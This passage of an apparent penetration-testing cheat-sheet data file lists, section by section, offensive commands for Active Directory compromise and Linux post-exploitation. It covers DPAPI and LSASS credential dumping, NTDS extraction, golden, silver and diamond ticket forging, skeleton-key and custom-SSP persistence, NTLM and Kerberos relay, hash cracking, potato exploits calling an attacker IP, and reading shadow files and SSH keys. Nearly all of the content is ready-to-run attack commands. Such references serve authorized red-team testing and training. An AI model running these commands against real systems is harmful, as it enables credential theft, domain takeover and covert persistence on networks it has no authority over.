                  "reg save HKLM\\SECURITY <file>;  reg save HKLM\\SYSTEM <file>",
                  "secretsdump.py -system SYSTEM -security SECURITY",
                  "reg.py <domain>/<user>:<password>@<ip> backup -o '\\\\<smb_ip>\\share"
                ]
              }
            ]
          },
          {
            "desc": "Extract credentials from DPAPI",
            "entries": [
              {
                "subdesc": "Browser passwords, WiFi creds, and other Windows secrets protected by DPAPI",
                "cmd": [
                  "DPAPI >>> User + Pass || PassTheHash || Clear text move",
                  "nxc smb <ip_range> -u <user> -p <password> --dpapi [cookies] [nosystem]",
                  "donpapi <domain>/<user>:<password>@<target>",
                  "dpapidump.py <domain>/<user>:<password>@<target>",
                  "get masterkey",
                  "mimikatz \"sekurlsa::dpapi",
                  "dploot.py browser -d <domain> -u <user> -p '<password>' <ip> -mkfile <masterkeys_file>",
                  "lsassy -d <domain> -u <user> -p <password> <ip> -m rdrleakdiag -M masterkeys",
                  "dploot.py browser -d <domain> -u <user> -p '<password>' <ip> -mkfile <masterkeys_file>",
                  "SharpDPAPI.exe triage",
                  "Crack users masterkey >>> DPAPImk",
                  "copy c:\\users\\<user>\\AppData\\Roaming\\Microsoft\\Protect\\<SID>",
                  "DPAPImk2john.py --preferred <prefered_file>",
                  "DPAPImk2john.py -c domain -mk <masterkey> -S <sid>"
                ]
              }
            ]
          },
          {
            "desc": "Impersonate",
            "entries": [
              {
                "subdesc": "Steal tokens from logged-on users to act as them without knowing their password",
                "cmd": [
                  "Impersonate >>> ACL || User + Pass",
                  "msf> use incognito impersonate_token <domain>\\\\<user>",
                  "nxc smb <ip> -u <localAdmin> -p <password> --loggedon-users",
                  "nxc smb <ip> -u <localAdmin> -p <password> -M schtask_as -o USER=<logged-on-user> CMD=<cmd-command>",
                  "irs.exe list",
                  "irs.exe exec -p <pid> -c <command>",
                  "Impersonate with adcs >>> NTLM || Pass The Hash / Ticket / Certificate",
                  "masky - d <domain> -u <user>  (-p <password> || -k || -H <hash>) -ca <certificate authority> <ip>",
                  "Impersonate RDP Session >>> RDP",
                  "psexec.exe -s -i cmd",
                  "query user",
                  "tscon.exe <id> /dest:<session_name>"
                ]
              }
            ]
          },
          {
            "desc": "Misc",
            "entries": [
              {
                "subdesc": "User enumeration via SMB, KeePass extraction, and Azure AD-Connect DCSync",
                "cmd": [
                  "Find Users >>> Username",
                  "smbmap.py --host-file ./computers.list -u <user> -p <password> -d <domain> -r 'C$\\Users' --dir-only --no-write-check --no-update --no-color --csv users_directory.csv",
                  "Extract Keepass >>> User + Pass",
                  "KeePwn.py plugin add -u '<user>' -p '<password>' -d '<domain>' -t <target> --plugin KeeFarceRebornPlugin.dll",
                  "KeePwn.py trigger add -u '<user>' -p '<password>' -d '<domain>' -t <target>",
                  "Hybrid (Azure AD-Connect) >>> DCSYNC",
                  "Dump cleartext password of MSOL Account on ADConnect Server",
                  "azuread_decrypt_msol_v2.ps1",
                  "nxc smb <ip> -u <user> -p <password> -M msol"
                ]
              }
            ]
          }
        ]
      },
      {
        "id": "active_directory_exploitation__dom_admin",
        "name": "Domain Admin",
        "description": "Full domain compromise actions — DCSync the entire domain, Golden/Silver ticket forging, and forest-wide credential harvesting.",
        "commands": [
          {
            "desc": "Dump ntds.dit",
            "entries": [
              {
                "subdesc": "Lateral move || Crack hash",
                "cmd": [
                  "nxc smb <dcip> -u <user> -p <password> -d <domain> --ntds",
                  "secretsdump.py '<domain>/<user>:<pass>'@<ip>",
                  "ntdsutil \"ac i ntds\" \"ifm\" \"create full c:\\temp\" q q",
                  "secretsdump.py -ntds ntds_file.dit -system SYSTEM_FILE -hashes lmhash:nthash LOCAL -outputfile ntlm-extract",
                  "msf> windows/gather/credentials/domain_hashdump",
                  "mimikatz lsadump::dcsync /domain:<target_domain> /user:<target_domain>\\administrator",
                  "certsync -u <user> -p '<password>' -d <domain> -dc-ip <dc_ip> -ns <name_server>"
                ]
              }
            ]
          },
          {
            "desc": "Grab backup Keys",
            "entries": [
              {
                "subdesc": "Credentials",
                "cmd": [
                  "donpapi collect - H ':<hash>' <domain>/<user>@<ip_range> -t ALL --fetch-pvk"
                ]
              }
            ]
          }
        ]
      },
      {
        "id": "active_directory_exploitation__trusts",
        "name": "Trusts",
        "description": "Enumerate and exploit domain and forest trusts — SID history injection, trust key extraction, and cross-trust Golden Tickets.",
        "commands": [
          {
            "desc": "Enumeration",
            "entries": [
              {
                "subdesc": "Map trust relationships between domains and forests — identify cross-trust attack paths",
                "cmd": [
                  "nltest.exe /trusted_domains",
                  "([System.DirectoryServices.ActiveDirectory.Domain]::GetCurrentDomain()).GetAllTrustRelationships()",
                  "Get-DomainTrust -Domain <domain>",
                  "Get-DomainTrustMapping",
                  "ldeep ldap -u <user> -p <password> -d <domain> -s ldap://<dc_ip> trusts",
                  "sharphound.exe -c trusts -d <domain>",
                  "MATCH p=(:Domain)-[:TrustedBy]->(:Domain) RETURN p",
                  "Get Domains SID",
                  "Get-DomainSID -Domain <domain> Get-DomainSID -Domain <target_domain>",
                  "lookupsid.py -domain-sids <domain>/<user>:<password>'@<dc> 0 lookupsid.py -domain-sids <domain>/<user>:<password>'@<target_dc> 0"
                ]
              }
            ]
          },
          {
            "desc": "Child->Parent",
            "entries": [
              {
                "subdesc": "Escalate from child domain to parent via trust key or SID history injection",
                "cmd": [
                  "Trust Key >>> PassTheTicket",
                  "mimikatz lsadump::trust /patch",
                  "mimikatz kerberos::golden /user:Administrator /domain:<domain> /sid:<domain_sid> /aes256:<trust_key_aes256> /sids:<target_domain_sid>-519 /service:krbtgt /target:<target_domain> /ptt",
                  "secretsdump.py -just-dc-user '<parent_domain>$'   <domain>/<user>:<password>@<dc_ip>",
                  "ticketer.py -nthash <trust_key> -domain-sid <child_sid> -domain <child_domain> -extra-sid <parent_sid>-519 -spn krbtgt/<parent_domain> trustfakeuser",
                  "Golden Ticket >>> PassTheTicket",
                  "mimikatz lsadump::dcsync /domain:<domain> /user:<domain>\\krbtgt",
                  "mimikatz kerberos::golden /user:Administrator /krbtgt:<HASH_KRBTGT> /domain:<domain> /sid:<user_sid> /sids:<RootDomainSID-519> /ptt",
                  "raiseChild.py <child_domain>/<user>:<password>",
                  "ticketer.py -nthash <child_krbtgt_hash> -domain-sid <child_sid> -domain <child_domain> -extra-sid <parent_sid>-519 goldenuser",
                  "Unconstrained delegation",
                  "coerce parent_dc on child_dc domain >>> unconstrained delegation"
                ]
              }
            ]
          },
          {
            "desc": "Parent->Child",
            "entries": [
              {
                "subdesc": "Same techniques as Child->Parent — trust is bidirectional",
                "cmd": [
                  "same as Child to parent"
                ]
              }
            ]
          },
          {
            "desc": "External Trust",
            "entries": [
              {
                "subdesc": "Exploit cross-forest or external domain trusts via password reuse, foreign group membership, or ADCS",
                "cmd": [
                  "DomainA <--> DomainB trust (B trust A, A trust B)",
                  "from A to B FOREST_TRANSITIVE",
                  "password reuse >>> lat move (creds/pth/...)",
                  "Foreign group and users >>> ACL",
                  "Users with foreign Domain Group Membership",
                  "MATCH p=(n:User {domain:\"<DOMAIN.FQDN>\"})-[:MemberOf]->(m:Group) WHERE m.domain<>n.domain RETURN p",
                  "Group with foreign Domain Group Membership",
                  "MATCH p=(n:Group {domain:\"<DOMAIN.FQDN>\"})-[:MemberOf]->(m:Group) WHERE m.domain<>n.domain RETURN p",
                  "SID History on B >>> PassTheTicket",
                  "Golden ticket",
                  "mimikatz lsadump::dcsync /domain:<domain> /user:<domain>\\krbtgt",
                  "mimikatz kerberos::golden /user:Administrator /krbtgt:<HASH_KRBTGT> /domain:<domain> /sid:<user_sid> /sids:<RootDomainSID>-<GROUP_SID_SUP_1000> /ptt",
                  "ticketer.py -nthash <krbtgt> -domain-sid <domain_a> -domain <domain_a> -extra-sid <domain_b_sid>-<group_sid sup 1000> fakeuser",
                  "Trust ticket",
                  "secretsdump.py -just-dc-user '<domainB>' <domainA>/<user>:'<password>'@<dc_a>",
                  "ticketer.py -nthash <trust_hash> -domain-sid <sid_a> -domain <domain_a> -extra-sid <domain_b_sid>-<group_sid sup 1000> -spn krbtgt/<domain_a> fakeuser",
                  "ADCS abuse >>> ADCS",
                  "from A to B is FOREST_TRANSITIVE|TREAT_AS_EXTERNAL",
                  "Unconstrained delegation",
                  "coerce dc_b on dc_a >>> unconstrained delegation",
                  "DomainA <-- DomainB trust (B trust A / A access B)",
                  "Same as double trust, but no unconstrained delegation as B can't connect to A",
                  "DomainA --> DomainB trust (A trust B / B access A)",
                  "password reuse >>> lat move (creds/pth/...)"
                ]
              }
            ]
          },
          {
            "desc": "Mssql links",
            "entries": [
              {
                "subdesc": "MSSQL",
                "cmd": [
                  "MSSQL trusted links doesn't care of trust link",
                  "Get-SQLServerLinkCrawl -username <user> -password <pass> -Verbose -Instance <sql_instance>",
                  "mssqlclient.py -windows-auth <domain>/<user>:<password>@<ip>",
                  "trustlink",
                  "sp_linkedservers",
                  "use_link"
                ]
              }
            ]
          }
        ]
      },
      {
        "id": "active_directory_exploitation__persistence",
        "name": "Persistence",
        "description": "Maintain access in Active Directory — Golden/Silver/Diamond/Sapphire tickets, skeleton key, AdminSDHolder, DSRM, custom SSP, and SID history.",
        "commands": [
          {
            "desc": "ADD DA",
            "entries": [
              {
                "subdesc": "Quick persistence — add a controlled user to Domain Admins",
                "cmd": [
                  "net group \"domain admins\" myuser /add /domain"
                ]
              }
            ]
          },
          {
            "desc": "Golden ticket",
            "entries": [
              {
                "subdesc": "Forged TGT valid for any service — requires krbtgt hash. Survives password resets",
                "cmd": [
                  "ticketer.py -aesKey <aeskey> -domain-sid <domain_sid> -domain <domain> <anyuser>",
                  "mimikatz \"kerberos::golden /user:<admin_user> /domain:<domain> /sid:<domain-sid>/aes256:<krbtgt_aes256> /ptt"
                ]
              }
            ]
          },
          {
            "desc": "Silver Ticket",
            "entries": [
              {
                "subdesc": "Forged TGS for a specific service — requires machine account hash. No DC contact needed",
                "cmd": [
                  "mimikatz \"kerberos::golden /sid:<current_user_sid> /domain:<domain-sid> /target:<target_server> /service:<target_service> /aes256:<computer_aes256_key> /user:<any_user> /ptt",
                  "ticketer.py -nthash <machine_nt_hash> -domain-sid <domain_sid> -domain <domain> <anyuser>"
                ]
              }
            ]
          },
          {
            "desc": "Directory Service Restore Mode (DSRM)",
            "entries": [
              {
                "subdesc": "Enable DSRM logon to persist as local admin on DCs — survives domain-level cleanup",
                "cmd": [
                  "PowerShell New-ItemProperty \"HKLM:\\System\\CurrentControlSet\\Control\\Lsa\\\" -Name \"DsrmAdminLogonBehavior\" -Value 2 -PropertyType DWORD"
                ]
              }
            ]
          },
          {
            "desc": "Skeleton Key",
            "entries": [
              {
                "subdesc": "Patches LSASS on DC — any user can auth with mimikatz as password. Lost on reboot",
                "cmd": [
                  "mimikatz \"privilege::debug\" \"misc::skeleton\" \"exit\" #password is mimikatz"
                ]
              }
            ]
          },
          {
            "desc": "Custom SSP",
            "entries": [
              {
                "subdesc": "Logs all future logins to kiwissp.log in cleartext — stealthy credential harvesting",
                "cmd": [
                  "mimikatz \"privilege::debug\" \"misc::memssp\" \"exit",
                  "C:\\Windows\\System32\\kiwissp.log"
                ]
              }
            ]
          },
          {
            "desc": "Golden certificate",
            "entries": [
              {
                "subdesc": "Steal CA private key to forge any certificate — ultimate ADCS persistence",
                "cmd": [
                  "certipy ca -backup -ca '<ca_name>' -username <user>@<domain> -hashes <hash>",
                  "certipy forge -ca-pfx <ca_private_key> -upn <user>@<domain> -subject 'CN=<user>,CN=Users,DC=<CORP>,DC=<LOCAL>"
                ]
              }
            ]
          },
          {
            "desc": "Diamond ticket",
            "entries": [
              {
                "subdesc": "Modified legitimate TGT — more realistic than Golden Ticket, harder to detect",
                "cmd": [
                  "ticketer.py -request -domain <domain> -user <user> -password <password> -nthash <hash> -aesKey <aeskey> -domain-sid <domain_sid>  -user-id <user_id> -groups '512,513,518,519,520' <anyuser>"
                ]
              }
            ]
          },
          {
            "desc": "Sapphire Ticket",
            "entries": [
              {
                "subdesc": "S4U2Self + U2U combined — uses a legitimate TGT as input to forge a service ticket with arbitrary PAC. Hardest to detect.",
                "cmd": [
                  "ticketer.py -request -impersonate <anyuser> -domain <domain> -user <user> -password <password>  -nthash <hash> -aesKey <aeskey> -domain-sid <domain_sid>  'ignored"
                ]
              }
            ]
          }
        ]
      },
      {
        "id": "active_directory_exploitation__mitm",
        "name": "MITM / Relay",
        "description": "Man-in-the-middle and relay attacks — NTLM relay, IPv6 DNS takeover, ARP poisoning, and WPAD abuse to capture or relay credentials.",
        "commands": [
          {
            "desc": "Listen",
            "entries": [
              {
                "subdesc": "Hash NTLMv1 or NTLMv2 || Username || Credentials (ldap/http)",
                "cmd": [
                  "responder -l <interface> #use --lm to force downgrade",
                  "smbclient.py"
                ]
              }
            ]
          },
          {
            "desc": "NTLM relay",
            "entries": [
              {
                "subdesc": "Relay captured NTLM auth to LDAP, SMB, HTTP, MSSQL, or NETLOGON for privilege escalation",
                "cmd": [
                  "MS08-068 self relay @CVE@",
                  "msf> exploit/windows/smb_smb_relay # windows 2000 / windows server 2008",
                  "SMB -> LDAP(S)",
                  "NTLMv1",
                  "remove mic (no CVE needed)  >>> see LDAP(S)",
                  "NTLMv2",
                  "Remove mic (CVE-2019-1040) @CVE@ >>> see LDAP(S)",
                  "HTTP(S) -> LDAP(S)",
                  "Usually from webdav coerce >>> see LDAP(S)",
                  "To LDAP(S)",
                  "Relay to LDAP if LDAP signing and LDAPS channel binding not enforced (default)",
                  "ntlmrelayx.py -t ldaps://<dc_ip> --remove-mic -smb2support --add-computer <computer_name> <computer_password> --delegate-access ` >>> RBCD",
                  "ntlmrelayx.py -t ldaps://<dc_ip> --remove-mic -smb2support --shadow-credentials --shadow-target '<dc_name$>'` >>> Shadow Credentials",
                  "ntlmrelayx.py -t ldaps://<dc_ip> --remove-mic -smb2support --escalate-user <user>` >>> Domain admin",
                  "ntlmrelayx.py -t ldaps://<dc_ip> --remove-mic -smb2support --interactive # connect to ldap_shell with nc 127.0.0.1 10111` >>> LDAP SHELL",
                  "To SMB",
                  "Relay to SMB (if SMB is not signed)",
                  "Find SMB not signed targets (default if not a Domain controler)",
                  "nxc smb <ip_range> --gen-relay-list smb_unsigned_ips.txt",
                  "ntlmrelayx.py -tf smb_unsigned_ips.txt -smb2support [--ipv6] -socks` >>> SMB Socks",
                  "To HTTP",
                  "Relay to CA web enrollement >>> ESC8",
                  "Relay to WSUS >>> WSUS",
                  "To MsSQL",
                  "ntlmrelayx.py -t mssql://<ip> [-smb2support] -socks` >>> MSSQL Socks",
                  "SMB -> NETLOGON",
                  "Zero-Logon (safe method) (CVE-202-1472) @CVE@",
                  "Relay one dc to another",
                  "ntlmrelayx.py -t dcsync://<dc_to_ip> -smb2support -auth-smb <user>:<password>` >>> DCSYNC"
                ]
              }
            ]
          },
          {
            "desc": "Kerberos relay",
            "entries": [
              {
                "subdesc": "Relay Kerberos authentication to HTTP (ADCS ESC8) or SMB/LDAP services",
                "cmd": [
                  "To HTTP",
                  "krbrelayx.py -t 'http://<pki>/certsrv/certfnsh.asp' --adcs --template DomainController -v '<target_netbios>$' -ip <attacker_ip>` >>> ESC8",
                  "SMB -> SMB",
                  "same as NTLM relay, use krbrelayx.py",
                  "SMB -> LDAP(S)",
                  "same as NTLM relay, use krbrelayx.py"
                ]
              }
            ]
          }
        ]
      },
      {
        "id": "active_directory_exploitation__crack_hash",
        "name": "Crack Hashes",
        "description": "Offline cracking of captured AD hashes — NTLM, NTLMv2, Kerberos TGS, AS-REP, and MSCACHE2 using hashcat and john.",
        "commands": [
          {
            "desc": "LM (299bd128c1101fd6)",
            "entries": [
              {
                "subdesc": "Legacy LM hashes — weak, fast to crack. hashcat -m 3000",
                "cmd": [
                  "john --format=lm hash.txt --wordlist=<rockyou.txt>",
                  "hashcat -m 3000 -a 0 hash.txt <rockyou.txt>"
                ]
              }
            ]
          },
          {
            "desc": "NT (b4b9b02e6f09a9bd760...)",
            "entries": [
              {
                "subdesc": "Standard NTLM hash — no salt, fast to crack. hashcat -m 1000",
                "cmd": [
                  "john --format=nt hash.txt --wordlist=<rockyou.txt>",
                  "hashcat -m 1000 -a 0 hash.txt <rockyou.txt>"
                ]
              }
            ]
          },
          {
            "desc": "NTLMv1 (user::85D5BC...)",
            "entries": [
              {
                "subdesc": "Net-NTLMv1 challenge/response — can be cracked or sent to crack.sh. hashcat -m 5500",
                "cmd": [
                  "john --format=netntlm hash.txt --wordlist=<rockyou.txt>",
                  "hashcat -m 1000 -a 0 hash.txt <rockyou.txt>",
                  "crack.sh",
                  "[https://crack.sh/](https://crack.sh/)"
                ]
              }
            ]
          },
          {
            "desc": "NTLMv2 (user::N46iSNek...)",
            "entries": [
              {
                "subdesc": "Net-NTLMv2 challenge/response — captured via Responder. hashcat -m 5600",
                "cmd": [
                  "john --format=netntlmv2 hash.txt --wordlist=<rockyou.txt>",
                  "hashcat -m 5600 -a 0 hash.txt <rockyou.txt>"
                ]
              }
            ]
          },
          {
            "desc": "Kerberos 5 TGS ($krb5tgs$23$...)",
            "entries": [
              {
                "subdesc": "Kerberoasted service ticket — RC4 encrypted. hashcat -m 13100",
                "cmd": [
                  "john --format=krb5tgs hash.txt --wordlist=<rockyou.txt>",
                  "hashcat -m 13100 -a 0 hash.txt <rockyou.txt>"
                ]
              }
            ]
          },
          {
            "desc": "Kerberos 5 TGS AES128 ($krb5tgs$17...)",
            "entries": [
              {
                "subdesc": "AES-encrypted Kerberos ticket — slower to crack. hashcat -m 19600",
                "cmd": [
                  "hashcat -m 19600 -a 0 hash.txt <rockyou.txt>"
                ]
              }
            ]
          },
          {
            "desc": "Kerberos ASREP ($krb5asrep$23...)",
            "entries": [
              {
                "subdesc": "AS-REP roasted hash — user has pre-auth disabled. hashcat -m 18200",
                "cmd": [
                  "hashcat -m 18200 -a 0 hash.txt <rockyou.txt>"
                ]
              }
            ]
          },
          {
            "desc": "MSCache 2 (very slow) ($DCC2$10240...)",
            "entries": [
              {
                "subdesc": "Domain Cached Credentials v2 — 10240 PBKDF2 iterations, very slow. hashcat -m 2100",
                "cmd": [
                  "hashcat -m 2100 -a 0 hash.txt <rockyou.txt>"
                ]
              }
            ]
          },
          {
            "desc": "Timeroast hash ($sntp-ms$...)",
            "entries": [
              {
                "subdesc": "NTP-MS hash from computer accounts — brute-force machine passwords. hashcat -m 31300",
                "cmd": [
                  "hashcat -m 31300 -a 3 hash.txt -w 3 ?l?l?l?l?l?l?l"
                ]
              }
            ]
          },
          {
            "desc": "pxe hash ($sccm$aes128$...)",
            "entries": [
              {
                "subdesc": "PXE boot media password hash from SCCM. hashcat -m 19850",
                "cmd": [
                  "hashcat -m 19850 -a 0 hash.txt <rockyou.txt>"
                ]
              }
            ]
          }
        ]
      },
      {
        "id": "active_directory_exploitation__low_access",
        "name": "Low Access Privesc",
        "description": "Windows local privilege escalation from low-privilege or service accounts. Check privileges, group memberships, service misconfigurations, and known CVEs.",
        "commands": [
          {
            "desc": "Bypass Applocker",
            "entries": [
              {
                "subdesc": "Low access (without applocker)",
                "cmd": [
                  "Get-Applocker infos",
                  "Get-ChildItem -Path HKLM:\\SOFTWARE\\Policies \\Microsoft\\Windows\\SrpV2\\Exe (dll/msi/...)",
                  "files in writables paths",
                  "C:\\Windows\\Temp",
                  "C:\\Windows\\Tasks",
                  "installutil.exe /logfile= /LogToConsole=false /U C:\\runme.exe",
                  "mshta.exe my.hta",
                  "MsBuild.exe pshell.xml"
                ]
              }
            ]
          },
          {
            "desc": "UAC bypass",
            "entries": [
              {
                "subdesc": "Bypass UAC when running as admin but integrity level is Medium",
                "cmd": [
                  "Fodhelper.exe → HKCU:\\Software\\Classes\\ms-settings\\Shell\\Open\\command → DelegateExecute + default value",
                  "wsreset.exe → same registry path, abuses Windows Store reset",
                  "msdt.exe → diagnostic tool, triggers elevated execution"
                ]
              }
            ]
          },
          {
            "desc": "Auto Enum",
            "entries": [
              {
                "subdesc": "Automated privilege escalation enumeration tools",
                "cmd": [
                  "winPEASany_ofs.exe",
                  ".\\PrivescCheck.ps1;  Invoke-PrivescCheck -Extended",
                  "PowerUp.ps1: powershell -ep bypass -c \". .\\PowerUp.ps1; Invoke-AllChecks\"",
                  "Get-ModifiableServiceFile → finds services with writable binaries",
                  "Install-ServiceBinary -Name '<service>' → replaces binary with adduser payload"
                ]
              }
            ]
          },
          {
            "desc": "Search files",
            "entries": [
              {
                "subdesc": "Hunt for cleartext credentials in files",
                "cmd": [
                  "findstr /si 'pass' *.txt *.xml *.docx *.ini",
                  "findstr /si 'password' *.config *.cfg *.log",
                  "dir /s /b *pass* *cred* *secret* 2>nul",
                  "Get-ChildItem -Path C:\\ -Include *.txt,*.xml,*.ini -Recurse -ErrorAction SilentlyContinue | Select-String -Pattern 'password'"
                ]
              }
            ]
          },
          {
            "desc": "Server Operators Group",
            "entries": [
              {
                "subdesc": "Check membership",
                "cmd": [
                  "net localgroup \"Server Operators\""
                ]
              },
              {
                "subdesc": "Find modifiable service",
                "cmd": [
                  "accesschk.exe /accepteula -uwcqv \"Server Operators\" *"
                ]
              },
              {
                "subdesc": "Replace service binary path and restart",
                "cmd": [
                  "sc config <service> binpath= \"cmd /c net localgroup Administrators <user> /add\"",
                  "sc stop <service>",
                  "sc start <service>"
                ]
              }
            ]
          },
          {
            "desc": "SeImpersonatePrivilege",
            "entries": [
              {
                "subdesc": "Service accounts (IIS/MSSQL) → SYSTEM via potato attacks",
                "cmd": [
                  "whoami /priv → check SeImpersonatePrivilege Enabled",
                  "PrintSpoofer.exe -i -c powershell.exe",
                  "JuicyPotato.exe -l 1337 -c {CLSID} -p c:\\windows\\system32\\cmd.exe -a \"/c <payload>\" -t *",
                  "GodPotato.exe -cmd \"cmd /c <payload>\"",
                  "RoguePotato.exe -r <attacker_ip> -e \"cmd /c <payload>\" -l 9999",
                  "RemotePotato0.exe -m 2 -x <attacker_ip> -p 9999 -s 1"
                ]
              }
            ]
          },
          {
            "desc": "SeBackupPrivilege",
            "entries": [
              {
                "subdesc": "Method 1 — SAM + SYSTEM dump",
                "cmd": [
                  "whoami /priv → check SeBackupPrivilege Enabled",
                  "reg save hklm\\sam C:\\Temp\\sam.save",
                  "reg save hklm\\system C:\\Temp\\system.save",
                  "secretsdump.py -sam sam.save -system system.save LOCAL"
                ]
              },
              {
                "subdesc": "Method 2 — Create prerequisite script",
                "cmd": [
                  "# Create script.txt: set context persistent nowriters / add volume c: alias xd / create / expose %xd% z:"
                ]
              },
              {
                "subdesc": "Method 2 — Execute diskshadow and extract",
                "cmd": [
                  "diskshadow /s script.txt",
                  "robocopy /b z:\\windows\\ntds . ntds.dit",
                  "secretsdump.py -ntds ntds.dit -system system.save LOCAL"
                ]
              }
            ]
          },
          {
            "desc": "SeTakeOwnershipPrivilege",
            "entries": [
              {
                "subdesc": "Take ownership of any object → replace system binaries",
                "cmd": [
                  "whoami /priv → check SeTakeOwnershipPrivilege Enabled",
                  "takeown /f C:\\Windows\\System32\\utilman.exe",
                  "icacls C:\\Windows\\System32\\utilman.exe /grant <user>:F",
                  "copy cmd.exe utilman.exe → trigger via lock screen Ease of Access"
                ]
              }
            ]
          },
          {
            "desc": "SeManageVolumePrivilege",
            "entries": [
              {
                "subdesc": "Check privilege",
                "cmd": [
                  "whoami /priv → check SeManageVolumePrivilege Enabled"
                ]
              },
              {
                "subdesc": "Exploit — DLL hijack for SYSTEM",
                "cmd": [
                  "# Write malicious DLL to C:\\Windows\\System32\\spool\\drivers\\x64\\3\\",
                  "# Copy PrintNotify.dll (malicious) to that path",
                  "# Trigger SpoolSV service restart → executes DLL as SYSTEM"
                ]
              }
            ]
          },
          {
            "desc": "SeRestorePrivilege",
            "entries": [
              {
                "subdesc": "Check privilege",
                "cmd": [
                  "whoami /priv → check SeRestorePrivilege Enabled"
                ]
              },
              {
                "subdesc": "Exploit with SeRestoreAbuse.exe",
                "cmd": [
                  "SeRestoreAbuse.exe \"cmd /c <payload>\""
                ]
              }
            ]
          },
          {
            "desc": "SeDebugPrivilege",
            "entries": [
              {
                "subdesc": "Debug any process → dump LSASS or inject into SYSTEM process",
                "cmd": [
                  "whoami /priv → check SeDebugPrivilege Enabled",
                  "procdump.exe -accepteula -ma lsass.exe lsass.dmp",
                  "mimikatz # sekurlsa::minidump lsass.dmp",
                  "mimikatz # sekurlsa::logonPasswords"
                ]
              }
            ]
          },
          {
            "desc": "Exploit",
            "entries": [
              {
                "subdesc": "Known local privilege escalation CVEs",
                "cmd": [
                  "SMBGhost CVE-2020-0796 @CVE@",
                  "CVE-2021-36934 (HiveNightmare/SeriousSAM) @CVE@",
                  "vssadmin list shadows",
                  "PrintNightmare CVE-2021-1675 / CVE-2021-34527 @CVE@"
                ]
              }
            ]
          },
          {
            "desc": "WSL Escalation",
            "entries": [
              {
                "subdesc": "If WSL is installed, abuse it to read host files or escalate",
                "cmd": [
                  "where /R C:\\Windows bash.exe wsl.exe",
                  "wsl whoami → check if running as root in WSL",
                  "wsl cat /etc/shadow → read host files from WSL context",
                  "wsl python3 -c 'import os; os.setuid(0); os.system(\"/bin/bash\")'"
                ]
              }
            ]
          },
          {
            "desc": "Token Impersonation (Meterpreter)",
            "entries": [
              {
                "subdesc": "If meterpreter session, steal tokens from running processes",
                "cmd": [
                  "meterpreter > load incognito",
                  "meterpreter > list_tokens -u",
                  "meterpreter > impersonate_token \"<DOMAIN>\\\\<admin_user>\""
                ]
              }
            ]
          },
          {
            "desc": "Webdav",
            "entries": [
              {
                "subdesc": "HTTP Coerce → relay to attacker-controlled WebDAV",
                "cmd": [
                  "open file <file>.searchConnector-ms",
                  "dnstool.py -u <domain>\\<user> -p <pass> --record 'attacker' --action add --data <ip_attacker> <dc_ip>",
                  "petitpotam.py -u '<user>' -p <pass> -d '<domain>' \"attacker@80/random.txt\" <ip>"
                ]
              }
            ]
          },
          {
            "desc": "Kerberos Relay",
            "entries": [
              {
                "subdesc": "Local privilege escalation via Kerberos relay (RBCD)",
                "cmd": [
                  "KrbRelayUp.exe relay -Domain <domain> -CreateNewComputerAccount -ComputerName <computer$> -ComputerPassword <password>",
                  "KrbRelayUp.exe spawn -m rbcd -d <domain> -dc <dc> -cn <computer_name> -cp <computer_pass>"
                ]
              }
            ]
          }
        ]
      }
    ]
  },

  /* ─── Phase 5: Post-Exploitation ──────────────────────── */
  {
    "id": "post_exploitation",
    "name": "Post-Exploitation",
    "optional": false,
    "items": [
      {
        "id": "post-1",
        "name": "Linux: User Enumeration",
        "description": "Identify current user context, groups, history, sudo rights, and other user accounts on the system.",
        "commands": [
          {
            "desc": "Current user context",
            "entries": [
              {
                "subdesc": "Who are we and what can we do?",
                "cmd": [
                  "whoami && id",
                  "sudo -l",
                  "cat /etc/passwd | grep -v nologin | grep -v false",
                  "cat /etc/shadow 2>/dev/null",
                  "cat /etc/group"
                ]
              }
            ]
          },
          {
            "desc": "User history & environment",
            "entries": [
              {
                "subdesc": "Check command history and environment variables for creds",
                "cmd": [
                  "history",
                  "cat ~/.bash_history",
                  "cat ~/.zsh_history 2>/dev/null",
                  "env",
                  "echo $PATH"
                ]
              }
            ]
          },
          {
            "desc": "Home directory secrets",
            "entries": [
              {
                "subdesc": "SSH keys, config files, dotfiles",
                "cmd": [
                  "find /home -type f -name '*.txt' -o -name '*.conf' -o -name '*.bak' -o -name '.bash_history' 2>/dev/null",
                  "find / -name 'id_rsa' -o -name 'id_dsa' -o -name 'id_ecdsa' -o -name 'authorized_keys' 2>/dev/null",
                  "cat ~/.ssh/id_rsa 2>/dev/null",
                  "cat ~/.ssh/authorized_keys 2>/dev/null"
                ]
              }
            ]
          },
          {
            "desc": "Writable directories & files",
            "entries": [
              {
                "subdesc": "Find world-writable paths for staging payloads or abuse",
                "cmd": [
                  "find / -writable -type d 2>/dev/null",
                  "find / -writable -type f 2>/dev/null | grep -v proc"
                ]
              }
            ]
          }
        ]
      },
      {
        "id": "post-2",
        "name": "Linux: System Enumeration",
        "description": "Identify OS version, kernel, architecture and installed packages for exploit matching.",
        "commands": [
          {
            "desc": "System identification",
            "entries": [
              {
                "subdesc": "OS, kernel, architecture",
                "cmd": [
                  "hostname",
                  "uname -a",
                  "cat /etc/os-release",
                  "cat /etc/issue",
                  "cat /proc/version",
                  "lscpu",
                  "df -h"
                ]
              }
            ]
          },
          {
            "desc": "Installed packages",
            "entries": [
              {
                "subdesc": "Find installed software for known vulnerable versions",
                "cmd": [
                  "dpkg -l 2>/dev/null",
                  "rpm -qa 2>/dev/null",
                  "apt list --installed 2>/dev/null"
                ]
              }
            ]
          }
        ]
      },
      {
        "id": "post-3",
        "name": "Linux: Network Enumeration",
        "description": "Discover internal network topology, listening services, routes, and pivot opportunities.",
        "commands": [
          {
            "desc": "Network interfaces & routing",
            "entries": [
              {
                "subdesc": "Interfaces, IPs, routes, ARP table",
                "cmd": [
                  "ip a",
                  "ip route",
                  "arp -a",
                  "cat /etc/resolv.conf",
                  "cat /etc/hosts"
                ]
              }
            ]
          },
          {
            "desc": "Listening services & connections",
            "entries": [
              {
                "subdesc": "Internal services that may be exploitable or pivotable",
                "cmd": [
                  "ss -tulpn",
                  "netstat -ano 2>/dev/null",
                  "ss -anp | grep LISTEN"
                ]
              }
            ]
          },
          {
            "desc": "Firewall rules",
            "entries": [
              {
                "subdesc": "Check iptables/nftables rules",
                "cmd": [
                  "iptables -L -n 2>/dev/null",
                  "cat /etc/iptables/rules.v4 2>/dev/null",
                  "nft list ruleset 2>/dev/null"
                ]
              }
            ]
          }
        ]
      },
      {
        "id": "post-4",
        "name": "Linux: Service Enumeration",
        "description": "Enumerate running services, mounted filesystems, loaded modules, and writable systemd units.",
        "commands": [
          {
            "desc": "Running services",
            "entries": [
              {
                "subdesc": "Active services and daemons",
                "cmd": [
